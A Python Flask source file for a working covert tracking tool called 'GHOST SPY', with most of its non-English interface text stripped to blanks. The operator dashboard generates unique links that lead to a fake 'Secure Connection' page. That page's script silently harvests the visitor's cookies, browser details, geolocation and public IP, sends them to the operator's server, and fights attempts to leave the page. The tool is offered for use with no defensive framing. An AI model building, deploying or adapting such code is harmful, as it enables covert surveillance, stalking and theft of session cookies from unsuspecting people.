# -*- coding: utf-8 -*-
import os
import uuid
import json
from datetime import datetime
from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)

#  ()
reports = {}

# =====================  HTML =====================
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>  </title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:radial-gradient(circle at 20% 30%, #0a0f1e, #03060c);font-family:'Segoe UI',system-ui;padding:2rem;color:#e0e0e0;}
        .container{max-width:1300px;margin:0 auto;}
        .header{background:rgba(15,25,45,0.6);backdrop-filter:blur(12px);border-radius:2rem;padding:1.5rem 2rem;margin-bottom:2rem;border:1px solid rgba(0,255,255,0.2);}
        h1{background:linear-gradient(135deg,#fff,#4affff);-webkit-background-clip:text;background-clip:text;color:transparent;display:inline-block;}
        .badge{background:#ff336622;padding:0.3rem 1rem;border-radius:50px;font-size:0.8rem;margin-left:1rem;border-left:2px solid #ff3366;}
        .link-card{background:#0f1422dd;border-radius:1.5rem;padding:1.5rem;margin:1.5rem 0;border:1px solid #2a3a66;}
        .link-input-group{display:flex;gap:1rem;flex-wrap:wrap;margin-top:1rem;}
        .link-input{flex:3;background:#010409;border:1px solid #3a4a7a;padding:1rem;border-radius:1rem;color:#7effd4;font-family:monospace;}
        .copy-btn{background:#1e2a4a;border:none;padding:0 2rem;border-radius:1rem;font-weight:bold;color:white;cursor:pointer;}
        .copy-btn:hover{background:#4affff;color:#000;}
        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:1rem;margin-bottom:2rem;}
        .stat-card{background:#0f1422cc;border-radius:1.2rem;padding:1rem;text-align:center;border:1px solid #2f4b7c;}
        .stat-number{font-size:2rem;color:#4affff;font-weight:bold;}
        .data-section{background:#0a0e18;border-radius:1.5rem;padding:1.5rem;}
        .report-card{background:#11161f;border-left:4px solid #ff3366;margin-bottom:1rem;padding:1rem;border-radius:1rem;}
        .report-time{color:#4affff;font-size:0.8rem;}
        pre{background:#010409;padding:1rem;border-radius:0.8rem;overflow-x:auto;font-size:0.8rem;color:#bbd9ff;}
        .refresh-hint{text-align:right;font-size:0.7rem;color:#6c8db0;margin-top:1rem;}
        button.refresh{background:none;border:1px solid #4affff;padding:0.3rem 1rem;border-radius:2rem;color:#4affff;cursor:pointer;}
        @media (max-width:700px){body{padding:1rem;}.link-input-group{flex-direction:column;}}
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1> GHOST SPY</h1>
        <span class="badge">LIVE · REMOTE ACCESS</span>
        <p style="margin-top:0.8rem;">     — , ,  </p>
    </div>
    <div class="link-card">
        <h3>   </h3>
        <div class="link-input-group">
            <input type="text" id="spyLink" class="link-input" value="{{ link }}" readonly>
            <button class="copy-btn" onclick="copyLink()"> </button>
        </div>
        <p style="margin-top:1rem;color:#aaa;">        </p>
    </div>
    <div class="stats">
        <div class="stat-card"><div class="stat-number">{{ reports[uid].data|length if reports[uid] else 0 }}</div><div></div></div>
        <div class="stat-card"><div class="stat-number">{{ "" if reports[uid] else "" }}</div><div></div></div>
    </div>
    <div class="data-section">
        <div style="display:flex;justify-content:space-between;margin-bottom:1rem;">
            <h3>  </h3>
            <button class="refresh" onclick="location.reload()"> </button>
        </div>
        {% if reports[uid] and reports[uid].data %}
            {% for item in reports[uid].data|reverse %}
            <div class="report-card">
                <div class="report-time"> {{ item.time }}</div>
                <pre>{{ item.data | tojson(indent=2) }}</pre>
            </div>
            {% endfor %}
        {% else %}
            <div class="report-card" style="text-align:center;">        </div>
        {% endif %}
        <div class="refresh-hint">     </div>
    </div>
</div>
<script>
function copyLink() {
    const input = document.getElementById('spyLink');
    input.select();
    navigator.clipboard.writeText(input.value);
    alert('  !');
}
setInterval(()=>{ location.reload(); }, 8000);
</script>
</body>
</html>
"""

# =====================   ( ) =====================
SPY_PAGE = """
<!DOCTYPE html>
<html>
<head><title>Secure Connection</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
    body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;flex-direction:column;}
    .loader{border:4px solid #222;border-top:4px solid #0f0;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin-bottom:20px;}
    @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
    h2{color:#4affff;}
    p{color:#aaa;}
</style>
<script>
(async function(){
    const SERVER = "{{ server }}";
    const UID = "{{ uid }}";
    function send(data){
        fetch(SERVER+'/api/report/'+UID, {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify(data)
        }).catch(e=>console.log);
    }
    let info = {
        ua: navigator.userAgent,
        platform: navigator.platform,
        lang: navigator.language,
        cookies: document.cookie,
        storage_local: localStorage.length,
        screen: screen.width+"x"+screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString()
    };
    send(info);
    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(p=>{
            info.location = {lat:p.coords.latitude, lon:p.coords.longitude};
            send(info);
        },()=>{});
    }
    fetch('https://api.ipify.org?format=json')
        .then(r=>r.json())
        .then(ip=>{ info.ip = ip.ip; send(info); })
        .catch(()=>{});
    window.onbeforeunload = function(){ return true; };
    setInterval(()=>{ history.pushState({}, '', '/'); }, 200);
})();
</script>
</head>
<body>
<div class="loader"></div>
<h2>   </h2>
<p>   ...</p>
</body>
</html>
"""

# =====================  =====================
@app.route('/')
def home():
    return redirect('/dashboard')

@app.route('/dashboard')
def dashboard():
    uid = str(uuid.uuid4())[:8]
    reports[uid] = {'data': [], 'created': datetime.now()}
    link = request.host_url.rstrip('/') + '/spy/' + uid
    return render_template_string(DASHBOARD_HTML, link=link, uid=uid, reports=reports)

@app.route('/spy/<uid>')
def spy(uid):
    if uid not in reports:
        return "Invalid link", 404
    return render_template_string(SPY_PAGE, server=request.host_url.rstrip('/'), uid=uid)

@app.route('/api/report/<uid>', methods=['POST'])
def receive_report(uid):
    if uid not in reports:
        return "Not found", 404
    data = request.get_json()
    reports[uid]['data'].append({
        'time': datetime.now().strftime('%H:%M:%S'),
        'data': data
    })
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)